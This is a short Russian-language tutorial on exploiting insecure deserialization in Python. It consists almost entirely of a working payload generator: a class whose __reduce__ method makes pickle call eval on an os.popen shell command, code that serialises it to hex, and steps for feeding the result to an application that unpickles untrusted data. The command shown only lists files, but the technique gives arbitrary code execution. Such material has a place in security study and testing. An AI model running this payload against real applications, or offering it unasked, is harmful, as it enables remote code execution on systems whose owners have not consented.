# Эксплуатация уязвимости Insecure Deserialization в Python с помощью pickle
import pickle
import base64

1. Создаем скрипт

class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('ls -la').read()",))


p = pickle.dumps(Exploit(), protocol=2)
print(p.hex())

2. Запускаем скрипт и получаем полезную нагрузку
python3 exploit.py

3. Вставляем полученную строку в уязвимое приложение, которое использует pickle для десериализации данных
